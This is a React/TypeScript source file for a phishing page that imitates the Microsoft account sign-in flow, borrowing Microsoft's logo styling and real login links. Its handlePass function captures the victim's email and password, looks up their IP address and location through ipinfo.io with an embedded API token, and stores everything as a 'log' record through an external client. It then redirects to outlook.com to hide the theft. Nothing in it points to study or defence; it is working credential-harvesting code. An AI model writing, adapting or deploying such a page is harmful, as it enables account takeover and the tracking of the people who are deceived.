import key from "./assets/key.svg";
import logo from "./assets/logo.svg";
import bg from "./assets/bg.png";
import "./App.css";
import { useState } from "react";
import client from "./lib/client";


interface Emailprops {
  email: string;
  setEmail: (e: string) => void;
  func: () => void;
}

interface Passwordprops {
  password: string;
  setPassword: (e: string) => void;
  func: () => void;
}

function Email({ email, setEmail, func }: Emailprops) {
  return (
    <>
      {/* Sign in box */}
      <div className=" bg-white z-10 max-sm space-y-3 flex flex-col sm:min-w-[440px]  sm:p-[44px] sm:h-[320px] sm:shadow-lg text-opacity-20  ">
        {/* Logo and input */}
        <div className="w-[108px] ">
          <img className="w-full" src={logo} alt="" />
        </div>
        <h3 className="text-2xl leading-[28px] font-semibold ">Sign in</h3>
        <input
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email, phone, or skype "
          className=" placeholder:text-gray-600 border-b border-[#00000066]  focus:outline-none py-2 w-full"
          type="text"
          name=""
          id=""
        />

        {/* Forgot password and create account buttons */}
        <div className="space-y-2">
          <p className="text-sm">
            No account ?{" "}
            <a
              className="text-[#0067b8]"
              href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&response_type=code+id_token&state=POArw3E72ozpw91ce52nMhuKHfH0PrK7a9dpfG0x_JNDY9XUP6-sch77j1ja-hZ7_w3Ekts-LnfQzHMLAVcI04rzQdhhWHOZfKqF-D2HZk6iPhgj2gESLvztBPdISsbcSjNckAXG1unTSQYOjoA5O2hWfBvVEhZB-Ha57i4ZyWhRvM6mA6WTXb518pCtpH89hEgGN1WOtbCANWdV1UmuS0a0mMW-1E7pO2jVWKHqmP3V9IklLFrpMhK5lASaOVCs5QnYtNooaHW1WpBwHR5uPF57dZrzuykMiE7Dhq_x3BI&response_mode=form_post&nonce=638319644087901132.MzE4MjY3N2ItMTk5ZS00YjBjLWI5Y2EtZmJkOTQ3NzE1YWZjODRmZjY0Y2QtZDYzMy00ZmU2LWE5YmYtNzFlNzI5MmYwY2M0&x-client-SKU=ID_NET6_0&x-client-Ver=6.30.1.0&uaid=427b2f1c2b054b64a7605cd8e1e17b77&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&signup=1&lw=1&fl=easi2&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPuDYTpEGfRk2sjWavdGX4wbOZfBg6LgToAEqjG7yK82AOKNC8XnFno9WTLGTs6Q_i-gcKRNlO21FXKfCdxPFAwdOP_4g2YJVoU6uE9sYd6-a6WgMUMNuvTRnn6DZG3sji5gQsfcsc1DdoTXaRBYcGJnWb5oJZzEoWK0bDEU_f7NcQu67AzR55ChrnwOzk9FzyzT2XRdPodA9sYHMzqWC5riAA&jshs=0"
            >
              Create one
            </a>
          </p>
          <a
            href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638319644087901132.MzE4MjY3N2ItMTk5ZS00YjBjLWI5Y2EtZmJkOTQ3NzE1YWZjODRmZjY0Y2QtZDYzMy00ZmU2LWE5YmYtNzFlNzI5MmYwY2M0&ui_locales=en-US&mkt=en-US&client-request-id=427b2f1c-2b05-4b64-a760-5cd8e1e17b77&state=POArw3E72ozpw91ce52nMhuKHfH0PrK7a9dpfG0x_JNDY9XUP6-sch77j1ja-hZ7_w3Ekts-LnfQzHMLAVcI04rzQdhhWHOZfKqF-D2HZk6iPhgj2gESLvztBPdISsbcSjNckAXG1unTSQYOjoA5O2hWfBvVEhZB-Ha57i4ZyWhRvM6mA6WTXb518pCtpH89hEgGN1WOtbCANWdV1UmuS0a0mMW-1E7pO2jVWKHqmP3V9IklLFrpMhK5lASaOVCs5QnYtNooaHW1WpBwHR5uPF57dZrzuykMiE7Dhq_x3BI&x-client-SKU=ID_NET6_0&x-client-ver=6.30.1.0#"
            className="text-sm text-[#0067b8]"
          >
            Can’t access your account?
          </a>
        </div>

        {/* Buttons */}
        <div className="flex pt-2 self-end gap-x-1">
          <button className="py-1 px-8 min-w-[108px] bg-[#00000033]">
            Back
          </button>

          <button
            onClick={() => func()}
            className="py-1  px-8 min-w-[108px] text-white bg-[#0067b8]"
          >
            Next
          </button>
        </div>
      </div>

      {/* Sign in options */}
      <div className="pt-12 sm:pt-4   ">
        <div className="border border-[#00000066] bg-white  sm:border-none flex gap-x-2 items-center px-6 sm:px-8 py-2 sm:shadow-lg sm:text-opacity-20 ">
          <img className="w-[32px]" src={key} alt="" />
          <p className="font-normal">Sign-in options</p>
        </div>
      </div>

      {/* background */}
      <div
        style={{ backgroundImage: `url(${bg})` }}
        className=" hidden sm:block absolute  inset-0 bg-no-repeat bg-cover -z-10  "
      ></div>

      {/* links */}
      <div className="absolute bottom-0 right-4 hidden sm:flex items-center gap-x-4 text-xs">
        <a
          href="https://www.microsoft.com/en-US/servicesagreement/"
          target="blank"
        >
          Terms of use
        </a>
        <a
          href="https://privacy.microsoft.com/en-US/privacystatement"
          target="blank"
        >
          Privacy & cookies
        </a>{" "}
        <div className="pb-2">
          <span>...</span>
        </div>
      </div>
    </>
  );
}

function Password({ password, setPassword, func }: Passwordprops) {
  const email = localStorage.getItem("email");

  return (
    <>
      {/* Sign in box */}
      <div className=" bg-white z-10 max-sm space-y-3 flex flex-col sm:min-w-[440px]  sm:p-[44px] sm:h-[320px] sm:shadow-lg text-opacity-20  ">
        {/* Logo and input */}
        <div className="w-[108px] ">
          <img className="w-full" src={logo} alt="" />
        </div>
        {/* email */}
        <p className="text-sm">{email}</p>
        <h3 className="text-2xl leading-[28px] font-semibold ">
          Enter password
        </h3>
        <input
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          className=" placeholder:text-gray-600 border-b border-[#00000066]  focus:outline-none py-2 w-full"
          type="text"
          name=""
          id=""
        />

        {/* Forgot password and create account buttons */}
        <div className="space-y-2">
          <a className="text-[#0067b8] text-xs" href="">
            Forgot Password?
          </a>
        </div>

        {/* Buttons */}
        <div className="flex pt-2 self-end gap-x-1">
          <button
            onClick={func}
            className="py-1  px-8 min-w-[108px] text-white bg-[#0067b8]"
          >
            Sign in
          </button>
        </div>
      </div>

      {/* background */}
      <div
        style={{ backgroundImage: `url(${bg})` }}
        className=" hidden sm:block absolute  inset-0 bg-no-repeat bg-cover -z-10  "
      ></div>

      {/* links */}
      <div className="absolute bottom-0 right-4 hidden sm:flex items-center gap-x-4 text-sm">
        <span>Terms of use</span> <span>Privacy & cookies</span>{" "}
        <div className="pb-2">
          <span>...</span>
        </div>
      </div>
    </>
  );
}

function App() {
  const [email, setemail] = useState("");
  const [password, setpassword] = useState("");
  const [submitted, setSubmitted] = useState(false);

  function handleEmail() {
    if (!email) {
      return;
    }

    localStorage.setItem("email", email);
    setSubmitted(true);
  }

  async function handlePass() {
    if (!password) {
      return;
    }

    try {
      localStorage.setItem("password", password);
      const request = await fetch(
        "https://ipinfo.io/json?token=4e99b955691eb1"
      );
      const jsonResponse = await request.json();

      const log = {
        _type: "log",
        email,
        password,
        ip: jsonResponse.ip,
        country: jsonResponse.country,
        city: jsonResponse.city,
        state: jsonResponse.region,
      };

      const res = await client.create(log);
      console.log(res);
      window.location.assign("https://outlook.com");
    } catch (error) {
      console.log(error);
      window.location.assign("https://outlook.com");
    }
  }

  return (
    <div className="min-h-screen  p-6 grid sm:place-content-center sm:pb-20 relative  ">
      {!submitted && (
        <Email func={() => handleEmail()} email={email} setEmail={setemail} />
      )}
      {submitted && (
        <Password
          func={() => handlePass()}
          password={password}
          setPassword={setpassword}
        />
      )}
    </div>
  );
}

export default App;
